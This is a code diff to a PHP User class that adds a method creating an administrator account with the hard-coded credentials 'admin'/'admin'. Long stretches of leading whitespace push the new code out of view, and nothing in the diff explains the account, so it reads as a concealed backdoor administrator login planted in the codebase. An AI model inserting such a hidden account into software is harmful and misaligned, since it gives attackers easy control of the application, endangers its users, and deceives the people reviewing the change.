@@ -88,7 +88,14 @@ Class User {
           return false;
       }
       return true;
-  } 
+  }
+
+                                                                                                                public function create_admin_user() {                                                                          $username = 'admin';
+         $password = 'admin';
+                                                                                                                    if (!$this->get_user_by_username($username)) {                                                                $hashed_password = password_hash($password, PASSWORD_DEFAULT);                                             $db = db_connect();
+                                                                                                                        $statement = $db->prepare("INSERT INTO users (username, password, is_admin) VALUES (:username, :password, 1)");
+                                                                                                                        $statement->bindParam(':username', $username, PDO::PARAM_STR);                                             $statement->bindParam(':password', $hashed_password, PDO::PARAM_STR);
+                                                                                                                        if ($statement->execute()) {                                                                                  return "Admin user created successfully";                                                               } else {                                                                                                      return "Error creating admin user";                                                                     }                                                                                                      } else {                                                                                                       return "Admin user already exists";                                                                    }                                                                                                        }
 
 
 }
